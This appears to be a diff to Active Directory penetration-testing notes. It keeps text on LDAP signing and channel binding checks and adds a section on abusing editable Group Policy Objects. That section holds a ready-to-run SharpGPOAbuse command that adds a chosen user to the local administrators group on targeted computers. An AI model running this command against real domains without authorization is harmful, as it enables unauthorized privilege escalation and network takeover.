@@ -43,3 +43,13 @@ Check the actual host and connection direction. Current Microsoft guidance disti
 ## LDAP signing and channel binding
 
 Signing and TLS channel binding are separate controls. Server 2025 new deployments and upgrades can have different effective policies. Check both; an LDAPS endpoint alone does not prove relay resistance. [Signing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing), [channel binding](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding).
+
+## GPO permissions
+
+When a controlled principal can edit a GPO that applies to a target computer, push a task or group change through it:
+
+```cmd
+SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --GPOName "Default Domain Policy" --Command "cmd.exe" --Arguments "/c net localgroup administrators {{USER}} /add"
+```
+
+Confirm the GPO's scope links to an OU holding the target, then force a refresh or wait for policy application. [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse).
